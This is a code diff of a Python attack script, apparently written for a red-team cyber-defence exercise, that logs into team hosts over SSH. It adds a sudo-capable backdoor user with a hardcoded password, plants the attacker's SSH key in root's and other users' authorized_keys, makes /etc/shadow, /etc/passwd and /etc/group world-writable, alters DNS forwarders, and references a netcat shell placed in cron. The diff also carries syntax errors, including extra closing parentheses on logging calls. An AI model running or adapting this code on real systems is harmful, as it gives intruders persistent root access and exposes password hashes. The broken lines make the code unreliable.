@@ -10,7 +10,7 @@ from os.path import expanduser
 
 
 class Host:
-    def __init__(self, team_number, last_octet=0, base_ip=[172, 25, 20, 0], username="root", password="changeme"):
+    def __init__(self, team_number, hostname, last_octet=0, base_ip=[172, 25, 20, 0], username="root", password="changeme"):
         self.ip = "%d.%d.%d.%d" % (base_ip[0], base_ip[1], base_ip[2] + team_number, last_octet)
         self.last_octet = last_octet
         self.username = username
@@ -20,9 +20,9 @@ class Host:
 class Team:
     def __init__(self, team_number):
         self.number = team_number
-        self.ubuntu = Host(team_number, last_octet=23)
-        self.centos = Host(team_number, last_octet=11)
-        self.pfsense = Host(team_number, last_octet=2, username="admin", password="changeme")
+        self.ubuntu = Host(team_number, "dns", last_octet=23)
+        self.centos = Host(team_number, "ecom", last_octet=11)
+        self.pfsense = Host(team_number, "pfsense", last_octet=2, username="admin", password="changeme")
 
 def main():
     last_octet = {}
@@ -45,6 +45,13 @@ def main():
         print(team.centos.ip)
         universal_linux_attack(team.centos)
         print(team.pfsense.ip)
+
+def log_line(message, host, print=False):
+    file_name = "team{0}-{1}.log".format(host.team, host.name)
+    with open(file_name, "a") as log:
+        log.write(message)
+    if print:
+        print(message)
 
 def get_ssh_pub():
     home = expanduser("~")
@@ -75,11 +82,13 @@ def universal_linux_attack(host):
     username = "tom"
     password = "hunter2"
     user_add_cmd = "useradd -m -d /home/{0}/ -s /bin/bash {0}".format(username)
-    print("Adding user {0} with password \'{1}\' to {2}".format(username, password, host.ip))
+    
+    
+    log_line("Adding user {0} with password \'{1}\' to {2}".format(username, password, host.ip), host, print=True)
     
     ssh.sendline(user_add_cmd)
     ssh.prompt()
-    print(ssh.before.decode('utf8'))
+    log_line(ssh.before.decode('utf8'), host)
 
     user_passwd_cmd = "passwd {0}".format(username)
     ssh.sendline(user_passwd_cmd)
@@ -88,29 +97,26 @@ def universal_linux_attack(host):
     ssh.expect("password: ")
     ssh.sendline(password)
     ssh.prompt()
-    
-    print(ssh.before.decode('utf8'))
+    log_line(ssh.before.decode('utf8'), host)
     
     # add user to sudoers
-    print("Adding user {0} to sudoers on {1}.".format(username, host.ip))
+    log_line("Adding user {0} to sudoers on {1}.".format(username, host.ip), host, print=True)
     sudo_add_cmd = "usermod -a -G admin {0} || usermod -a -G wheel {0}".format(username)
-    
     ssh.sendline(sudo_add_cmd)
+    ssh.prompt()
+    log_line(ssh.before.decode('utf8'), host)
 
-    
     # Add SSH keys
     user_directories = {
         "root" : "/root",
-        username : "/home/{}".format(username),
-        "php" : "/home/php"
+        username : "/home/{}".format(username)
     }
     user_group = {
         "root" : "root",
-        username : username,
-        "php" : "root"
+        username : username
     }
     ssh_pub_key = get_ssh_pub()
-    ssh.prompt()
+
     for user, directory in user_directories.items():
         sshdir_make_cmd = "mkdir -p \'{}/.ssh\'".format(directory)
         sshdir_perms_cmd = "chmod 700 {1} && chown {0}:{2} {1}".format(user, directory, user_group[user])
@@ -119,40 +125,40 @@ def universal_linux_attack(host):
 
         ssh_add_cmd = "echo \"{0}\" >> {1}".format(ssh_pub_key, authorized_keys_file)
 
-        print("Adding SSH key to user {0} at {1} to sudoers on {2}.".format(user, authorized_keys_file, host.ip))
+        log_line("Adding SSH key to user {0} at {1} to sudoers on {2}.".format(user, authorized_keys_file, host.ip), host, print=True))
         authorized_perms_cmd = "chmod 600 {1} && chown {0}:{2} {1}".format(user, authorized_keys_file, user_group[user])
         
         commands_to_run = [sshdir_make_cmd, sshdir_perms_cmd, ssh_add_cmd, authorized_perms_cmd]
         for command in commands_to_run:  
             ssh.sendline(command)
             ssh.prompt()
-            print(ssh.before.decode('utf8'))
+            log_line(ssh.before.decode('utf8'), host)
 
     
     
     # ez mode /etc/shadow
     shadow_perms_cmd = "chmod 777 /etc/shadow"
     ssh.prompt()
-    print("Setting permissions to 777 on /etc/shadow on {}".format(host.ip))
+    log_line("Setting permissions to 777 on /etc/shadow on {}".format(host.ip), host, print=True)
     ssh.sendline(shadow_perms_cmd)
     ssh.prompt()
-    print(ssh.before.decode('utf8'))
+    log_line(ssh.before.decode('utf8'), host)
     
     # ez mode /etc/passwd
     passwd_perms_cmd = "chmod 777 /etc/passwd"
     
-    print("Setting permissions to 777 on /etc/shadow on {}".format(host.ip))
+    log_line("Setting permissions to 777 on /etc/shadow on {}".format(host.ip), host, print=True)
     ssh.sendline(passwd_perms_cmd)
     ssh.prompt()
-    print(ssh.before.decode('utf8'))
+    log_line(ssh.before.decode('utf8'), host)
 
      # ez mode /etc/group
     group_perms_cmd = "chmod 777 /etc/group"
     
-    print("Setting permissions to 777 on /etc/group on {}".format(host.ip))
+    log_line("Setting permissions to 777 on /etc/group on {}".format(host.ip), host, print=True)
     ssh.sendline(group_perms_cmd)
     ssh.prompt()
-    print(ssh.before.decode('utf8'))
+    log_line(ssh.before.decode('utf8'), host)
 
     # add netcat shell to cron
     netcat_port = "1{}{}".format(host.team, host.last_octet)
@@ -173,6 +179,36 @@ def ubuntu_attacks(host):
     ssh.sendline(change_forwarders_cmd)
     ssh.prompt()
     ssh.sendline(reload_bind_cmd)
+
+
+
+    ## Add ssh key to php
+    # Add SSH keys
+    user_directories = {
+        "php" : "/home/php"
+    }
+    user_group = {
+        "php" : "root"
+    }
+
+    ssh_pub_key = get_ssh_pub()
+
+    for user, directory in user_directories.items():
+        sshdir_make_cmd = "mkdir -p \'{}/.ssh\'".format(directory)
+        sshdir_perms_cmd = "chmod 700 {1} && chown {0}:{2} {1}".format(user, directory, user_group[user])
+        
+        authorized_keys_file = "{}/.ssh/authorized_keys".format(directory)
+
+        ssh_add_cmd = "echo \"{0}\" >> {1}".format(ssh_pub_key, authorized_keys_file)
+
+        log_line("Adding SSH key to user {0} at {1} to sudoers on {2}.".format(user, authorized_keys_file, host.ip), host, print=True))
+        authorized_perms_cmd = "chmod 600 {1} && chown {0}:{2} {1}".format(user, authorized_keys_file, user_group[user])
+        
+        commands_to_run = [sshdir_make_cmd, sshdir_perms_cmd, ssh_add_cmd, authorized_perms_cmd]
+        for command in commands_to_run:  
+            ssh.sendline(command)
+            ssh.prompt()
+            log_line(ssh.before.decode('utf8'), host)
     pass
 
 def centos_attacks(host):
